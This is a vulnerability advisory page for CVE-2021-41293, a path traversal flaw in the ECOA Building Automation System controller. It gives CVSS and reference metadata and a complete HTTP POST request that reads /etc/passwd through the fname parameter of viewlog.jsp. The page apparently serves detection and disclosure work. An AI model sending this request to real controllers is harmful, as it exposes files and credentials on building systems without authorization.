---
layout: post
cve_id: CVE-2021-41293
title: ECOA Building Automation System - Arbitrary File Retrieval
pcap: true
pcap_path: /pcaps/2021/CVE-2021-41293.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-41293.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0x_Akoko
severity: high
impact: 'Unauthenticated attackers can read arbitrary files from the ECOA BAS controller
  including /etc/passwd via path traversal in the fname parameter, potentially exposing
  sensitive system configuration and credentials.

  '
remediation: 'Apply the latest security patches or updates provided by the vendor
  to fix the arbitrary file retrieval vulnerability in the ECOA Building Automation
  System.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2021-41293
- https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5679.php
- https://www.twcert.org.tw/tw/cp-132-5129-7e623-1.html
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2021-41293
  cwe-id: CWE-22
  epss-score: 0.89647
  epss-percentile: 0.99537
  cpe: cpe:2.3:o:ecoa:ecs_router_controller-ecs_firmware:-:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: ecoa
  product: ecs_router_controller-ecs_firmware
tags:
- cve2021
- cve
- ecoa
- lfi
- disclosure
- vkev
- vuln
---

## üîç Vulnerability Description
The ECOA BAS controller suffers from an arbitrary file disclosure vulnerability. Using the 'fname' POST parameter in viewlog.jsp, attackers can disclose arbitrary files on the affected device and disclose sensitive and system information.

## üåê HTTP Request
```nohighlight
POST /viewlog.jsp HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15
Connection: close
Content-Length: 53
Accept-Encoding: gzip
yr=2021&mh=6&fname=../../../../../../../../etc/passwd
```

